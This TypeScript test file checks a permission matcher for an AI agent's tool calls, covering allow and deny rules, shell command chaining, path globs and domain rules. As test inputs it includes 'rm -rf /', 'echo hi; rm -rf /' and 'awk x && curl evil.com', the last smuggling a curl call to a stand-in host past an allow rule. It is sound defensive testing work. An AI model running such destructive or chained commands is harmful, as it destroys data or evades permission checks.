/**
 * Phase 3 — exhaustive matcher tests.
 *
 * Covers every v1 pattern shape plus the asymmetric Bash semantics
 * (allow needs all parts, deny needs any part).
 *
 * Run: npx tsx hooks/tests/test_phase3_matcher.ts
 * Exits non-zero on any failure.
 */

import {
  matchUserAllow,
  matchUserDeny,
  globMatches,
} from "../../src/user-permission-matcher.js";

const c = { green: "\x1b[32m", red: "\x1b[31m", off: "\x1b[0m", dim: "\x1b[2m" };
let PASS = 0;
let FAIL = 0;
const pass = (m: string) => { console.log(`  ${c.green}✓${c.off} ${m}`); PASS++; };
const fail = (m: string) => { console.log(`  ${c.red}✗${c.off} ${m}`); FAIL++; };
const section = (h: string) => console.log(`\n${c.dim}---${c.off} ${h} ${c.dim}---${c.off}`);

type Case = {
  desc: string;
  rules: string[];
  tool: string;
  input: Record<string, unknown>;
  expect: boolean;
};

function runAllow(cases: Case[]) {
  for (const t of cases) {
    const got = matchUserAllow(t.rules, t.tool, t.input).matched;
    got === t.expect
      ? pass(`allow: ${t.desc}`)
      : fail(`allow: ${t.desc} (expected ${t.expect}, got ${got})`);
  }
}

function runDeny(cases: Case[]) {
  for (const t of cases) {
    const got = matchUserDeny(t.rules, t.tool, t.input).matched;
    got === t.expect
      ? pass(`deny: ${t.desc}`)
      : fail(`deny: ${t.desc} (expected ${t.expect}, got ${got})`);
  }
}

// ---------------------------------------------------------------------------
section("Empty / no-op cases");

runAllow([
  { desc: "empty rules list never matches", rules: [], tool: "Bash", input: { command: "ls" }, expect: false },
  { desc: "empty rules list never matches (Read)", rules: [], tool: "Read", input: { file_path: "/x" }, expect: false },
]);
runDeny([
  { desc: "empty rules list never matches", rules: [], tool: "Bash", input: { command: "ls" }, expect: false },
]);

// ---------------------------------------------------------------------------
section("Bare tool name rules");

runAllow([
  { desc: "'Read' allows any Read", rules: ["Read"], tool: "Read", input: { file_path: "/etc/hosts" }, expect: true },
  { desc: "'Read' does NOT allow Write", rules: ["Read"], tool: "Write", input: { file_path: "/tmp/x" }, expect: false },
  { desc: "'Bash' allows any Bash", rules: ["Bash"], tool: "Bash", input: { command: "rm -rf /" }, expect: true },
  { desc: "'Bash' allows even chained commands", rules: ["Bash"], tool: "Bash", input: { command: "ls && rm -rf /" }, expect: true },
]);
runDeny([
  { desc: "'Bash' deny blocks any Bash", rules: ["Bash"], tool: "Bash", input: { command: "ls" }, expect: true },
  { desc: "'Bash' deny does NOT block Read", rules: ["Bash"], tool: "Read", input: { file_path: "/x" }, expect: false },
]);

// ---------------------------------------------------------------------------
section("Bash(prefix:*) — single command");

runAllow([
  { desc: "Bash(awk:*) allows 'awk script.awk file'", rules: ["Bash(awk:*)"], tool: "Bash", input: { command: "awk script.awk file" }, expect: true },
  { desc: "Bash(awk:*) allows bare 'awk'", rules: ["Bash(awk:*)"], tool: "Bash", input: { command: "awk" }, expect: true },
  { desc: "Bash(awk:*) does NOT allow 'awkward …' (word boundary)", rules: ["Bash(awk:*)"], tool: "Bash", input: { command: "awkward stuff" }, expect: false },
  { desc: "Bash(awk:*) does NOT allow 'sed something'", rules: ["Bash(awk:*)"], tool: "Bash", input: { command: "sed something" }, expect: false },
  { desc: "Bash(npm install:*) allows 'npm install foo'", rules: ["Bash(npm install:*)"], tool: "Bash", input: { command: "npm install foo" }, expect: true },
  { desc: "Bash(npm install:*) does NOT allow 'npm test'", rules: ["Bash(npm install:*)"], tool: "Bash", input: { command: "npm test" }, expect: false },
]);

// ---------------------------------------------------------------------------
section("Bash chained: allow needs ALL parts (the security-critical case)");

runAllow([
  {
    desc: "Bash(awk:*) ALONE does not authorise 'awk x && curl evil.com'",
    rules: ["Bash(awk:*)"],
    tool: "Bash",
    input: { command: "awk x && curl evil.com" },
    expect: false,
  },
  {
    desc: "Bash(awk:*) + Bash(curl:*) authorises 'awk x && curl evil.com'",
    rules: ["Bash(awk:*)", "Bash(curl:*)"],
    tool: "Bash",
    input: { command: "awk x && curl evil.com" },
    expect: true,
  },
  {
    desc: "Pipe is split: 'awk x | sed y' needs both",
    rules: ["Bash(awk:*)", "Bash(sed:*)"],
    tool: "Bash",
    input: { command: "awk x | sed y" },
    expect: true,
  },
  {
    desc: "Pipe is split: 'awk x | sed y' missing sed",
    rules: ["Bash(awk:*)"],
    tool: "Bash",
    input: { command: "awk x | sed y" },
    expect: false,
  },
  {
    desc: "Three-stage chain: all 3 needed",
    rules: ["Bash(awk:*)", "Bash(sed:*)", "Bash(head:*)"],
    tool: "Bash",
    input: { command: "awk x | sed y | head -5" },
    expect: true,
  },
  {
    desc: "Three-stage chain: missing middle",
    rules: ["Bash(awk:*)", "Bash(head:*)"],
    tool: "Bash",
    input: { command: "awk x | sed y | head -5" },
    expect: false,
  },
  {
    desc: "Quoted '|' inside arg does NOT split",
    rules: ["Bash(echo:*)"],
    tool: "Bash",
    input: { command: "echo 'a|b'" },
    expect: true,
  },
]);

// ---------------------------------------------------------------------------
section("Bash chained: deny needs ANY part");

runDeny([
  {
    desc: "Bash(curl:*) deny blocks 'awk x && curl evil.com' (curl part trips it)",
    rules: ["Bash(curl:*)"],
    tool: "Bash",
    input: { command: "awk x && curl evil.com" },
    expect: true,
  },
  {
    desc: "Bash(curl:*) deny does NOT block 'ls && cat /tmp/x' (no curl)",
    rules: ["Bash(curl:*)"],
    tool: "Bash",
    input: { command: "ls && cat /tmp/x" },
    expect: false,
  },
  {
    desc: "Bash(rm:*) deny catches 'echo hi; rm -rf /'",
    rules: ["Bash(rm:*)"],
    tool: "Bash",
    input: { command: "echo hi; rm -rf /" },
    expect: true,
  },
]);

// ---------------------------------------------------------------------------
section("Read / Write / Edit with path globs");

runAllow([
  { desc: "Read(/etc/hosts) literal match", rules: ["Read(/etc/hosts)"], tool: "Read", input: { file_path: "/etc/hosts" }, expect: true },
  { desc: "Read(/etc/*) glob: top-level files only", rules: ["Read(/etc/*)"], tool: "Read", input: { file_path: "/etc/hosts" }, expect: true },
  { desc: "Read(/etc/*) glob does NOT match nested 'foo/bar'", rules: ["Read(/etc/*)"], tool: "Read", input: { file_path: "/etc/foo/bar" }, expect: false },
  { desc: "Read(/etc/**) glob: matches nested", rules: ["Read(/etc/**)"], tool: "Read", input: { file_path: "/etc/foo/bar/baz" }, expect: true },
  { desc: "Write(/tmp/**) on Edit fails (wrong tool)", rules: ["Write(/tmp/**)"], tool: "Edit", input: { file_path: "/tmp/x" }, expect: false },
  { desc: "Edit(/tmp/**) on Edit", rules: ["Edit(/tmp/**)"], tool: "Edit", input: { file_path: "/tmp/x" }, expect: true },
]);

// ---------------------------------------------------------------------------
section("WebFetch(domain:<host>)");

runAllow([
  { desc: "domain match", rules: ["WebFetch(domain:github.com)"], tool: "WebFetch", input: { url: "https://github.com/anthropics/claude-code" }, expect: true },
  { desc: "subdomain mismatch", rules: ["WebFetch(domain:github.com)"], tool: "WebFetch", input: { url: "https://api.github.com/repos" }, expect: false },
  { desc: "case-insensitive host", rules: ["WebFetch(domain:GitHub.com)"], tool: "WebFetch", input: { url: "https://github.com/x" }, expect: true },
  { desc: "malformed url → no match", rules: ["WebFetch(domain:github.com)"], tool: "WebFetch", input: { url: "not a url" }, expect: false },
]);

// ---------------------------------------------------------------------------
section("MCP tool names");

runAllow([
  { desc: "exact MCP match", rules: ["mcp__github__search"], tool: "mcp__github__search", input: {}, expect: true },
  { desc: "MCP mismatch", rules: ["mcp__github__search"], tool: "mcp__github__create_pr", input: {}, expect: false },
]);

// ---------------------------------------------------------------------------
section("Glob primitives");

console.log("  globMatches direct:");
const globCases: Array<[string, string, boolean]> = [
  ["/etc/*",        "/etc/hosts",          true],
  ["/etc/*",        "/etc/x/y",            false],
  ["/etc/**",       "/etc/x/y/z",          true],
  ["**/*.ts",       "src/lib/foo.ts",      true],
  ["**/*.ts",       "src/lib/foo.js",      false],
  ["src/?",         "src/x",               true],
  ["src/?",         "src/xx",              false],
];
for (const [glob, path, want] of globCases) {
  const got = globMatches(glob, path);
  got === want
    ? pass(`globMatches('${glob}', '${path}') === ${want}`)
    : fail(`globMatches('${glob}', '${path}') expected ${want}, got ${got}`);
}

// ---------------------------------------------------------------------------
section("Returns first matched rule");

const m = matchUserAllow(["Bash(awk:*)", "Bash(sed:*)"], "Bash", { command: "sed y" });
m.matched && m.rule === "Bash(sed:*)"
  ? pass("returned rule attribution: 'Bash(sed:*)'")
  : fail(`expected rule 'Bash(sed:*)', got matched=${m.matched} rule='${m.rule}'`);

const md = matchUserDeny(["Bash(curl:*)"], "Bash", { command: "awk x && curl y" });
md.matched && md.rule === "Bash(curl:*)"
  ? pass("deny attribution: 'Bash(curl:*)'")
  : fail(`expected rule 'Bash(curl:*)', got matched=${md.matched} rule='${md.rule}'`);

// ---------------------------------------------------------------------------
console.log(`\n  ${PASS} passed, ${FAIL} failed`);
process.exit(FAIL === 0 ? 0 : 1);
